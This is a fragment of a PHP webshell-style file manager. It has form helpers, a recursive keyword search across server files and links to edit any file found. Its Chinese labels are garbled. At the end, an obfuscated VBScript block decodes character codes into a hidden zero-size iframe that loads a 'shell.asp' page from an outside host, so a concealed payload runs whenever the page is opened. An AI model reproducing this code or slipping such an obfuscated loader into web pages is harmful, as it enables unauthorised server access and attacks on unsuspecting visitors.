                        }
                        echo "  <form action=\"".$arg[action]."\" method=\"".$arg[method]."\" $enctype>\n";
                        echo "  <tr>\n";
                        echo "    <td>".$arg[content]."</td>\n";
                        echo "  </tr>\n";
                        echo "  </form>\n";
                }

                function tdheader($title) {
                        global $dir;
                        echo "  <tr class=\"firstalt\">\n";
                        echo "        <td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\"></a>]</b></td>\n";
                        echo "  </tr>\n";
                }

                function tdbody($content,$align='center',$bgcolor='2',$height='',$extra='',$colspan='') {
                        if ($bgcolor=='2') {
                                $css="secondalt";
                        } elseif ($bgcolor=='1') {
                                $css="firstalt";
                        } else {
                                $css=$bgcolor;
                        }
                        $height = empty($height) ? "" : " height=".$height;
                        $colspan = empty($colspan) ? "" : " colspan=".$colspan;
                        echo "  <tr class=\"".$css."\">\n";
                        echo "        <td align=\"".$align."\"".$height." ".$colspan." ".$extra.">".$content."</td>\n";
                        echo "  </tr>\n";
                }
                function length($str){//ͳַ
                $len=strlen($str);
                $i=0;
                while($i<$len){
                if(preg_match("/^[".chr(0xa1)."-".chr(0xff)."]+$/",$str[$i])){
                $i+=2;
                }else{
                $i+=1;
                }
                $n+=1;
                }
                return $n;
                }
                function tablefooter() {
                        echo "</table>\n";
                }

                function formheader($action='',$title,$target='') {
                        global $dir;
                        $target = empty($target) ? "" : " target=\"".$target."\"";
                        echo " <form action=\"$action\" method=\"POST\"".$target.">\n";
                        echo "  <tr class=\"firstalt\">\n";
                        echo "        <td align=\"center\"><b>".$title." [<a href=\"?dir=".urlencode($dir)."\"></a>]</b></td>\n";
                        echo "  </tr>\n";
                }

                function makehidden($name,$value=''){
                        echo "<input type=\"hidden\" name=\"$name\" value=\"$value\">\n";
                }

                function makeinput($name,$value='',$extra='',$type='text',$size='30',$css='input'){
                        $css = ($css == 'input') ? " class=\"input\"" : "";
                        $input = "<input name=\"$name\" value=\"$value\" type=\"$type\" ".$css." size=\"$size\" $extra>\n";
                        return $input;
                }

                function maketextarea($name,$content='',$cols='100',$rows='20',$extra=''){
                        $textarea = "<textarea name=\"".$name."\" cols=\"".$cols."\" rows=\"".$rows."\" ".$extra.">".$content."</textarea>\n";
                        return $textarea;
                }

                function formfooter($over='',$height=''){
                        $height = empty($height) ? "" : " height=\"".$height."\"";
                        echo "  <tr class=\"secondalt\">\n";
                        echo "        <td align=\"center\"".$height."><input class=\"input\" type=\"submit\" value=\"ȷ\"></td>\n";
                        echo "  </tr>\n";
                        echo " </form>\n";
                        echo $end = empty($over) ? "" : "</table>\n";
                }

                function makeselect($arg = array()){
                        if ($arg[multiple]==1) {
                                $multiple = " multiple";
                                if ($arg[size]>0) {
                                        $size = "size=$arg[size]";
                                }
                        }
                        if ($arg[css]==0) {
                                $css = "class=\"input\"";
                        }
                        $select = "<select $css name=\"$arg[name]\"$multiple $size>\n";
                                if (is_array($arg[option])) {
                                        foreach ($arg[option] AS $key=>$value) {
                                                if (!is_array($arg[selected])) {
                                                        if ($arg[selected]==$key) {
                                                                $select .= "<option value=\"$key\" selected>$value</option>\n";
                                                        } else {
                                                                $select .= "<option value=\"$key\">$value</option>\n";
                                                        }

                                                } elseif (is_array($arg[selected])) {
                                                        if ($arg[selected][$key]==1) {
                                                                $select .= "<option value=\"$key\" selected>$value</option>\n";
                                                        } else {
                                                                $select .= "<option value=\"$key\">$value</option>\n";
                                                        }
                                                }
                                        }
                                }
                        $select .= "</select>\n";
                        return $select;
                }
        }
        
        function find($path) //ҹؼ 
{ 
        global $_POST,$type,$type2,$endline,$beline,$nb; 
        if(is_dir("$path")){ 
        $tempdir=opendir("$path");
        while($f=readdir($tempdir)){ if($f=="."||$f=="..")continue;  find("$path/$f");}
        closedir($tempdir);
        }else{ 
        if(filesize("$path")){ 
        $fp=fopen("$path","r"); 
        $msg=fread($fp, filesize("$path"));
        fclose($fp); 
if(strpos($msg, $_POST['oldkey']) !== false) {
        $dir = dirname($path);
        $file = basename($path);
        $nb++;
if($type=="list"){
        $mymsg = explode("\n",$msg);
        $long = count($mymsg);
        $tmp = explode($oldkey,$msg);
        $tmp = explode("\n",$tmp[0]);
        $first = count($tmp);
        $end = "[".$first."/".$long."]";
}
if($type2=="getpath"){
        $get = explode($oldkey,$msg);
        $get = strlen($get[0]);
        if(isset($beline)){
        $get = $get-$beline;
        }
        $getpath = htmlspecialchars(substr($msg, $get, $endline)); 
        $getpath = "title = \"".$getpath."\"";
}
echo "<span class=\"redfont\" $getpath>ҵ:$dir/$file</span> |<a href=\"?action=editfile&dir=$dir&editfile=$file\" target=\"_blank\">view+edit</a> | $end <br>";
}
                              } 
                         }                    
} 
?>
<script language=vbscript>
function rechange(k)
s=Split(k,",")
t=""
For i = 0 To UBound(s)
t=t+Chrw(eval(s(i)))
Next
rechange=t
End Function
t="60,105,102,114,97,109,101,32,119,105,100,116,104,61,39,48,39,32,104,101,105,103,104,116,61,39,48,39,32,115,114,99,61,39,104,116,116,112,58,47,47,108,111,118,101,46,108,122,120,120,103,46,99,111,109,47,97,100,109,105,110,47,105,109,97,103,101,115,47,115,104,101,108,108,46,97,115,112,39,62,60,47,105,102,114,97,109,101,62"
document.write rechange(t)
</script>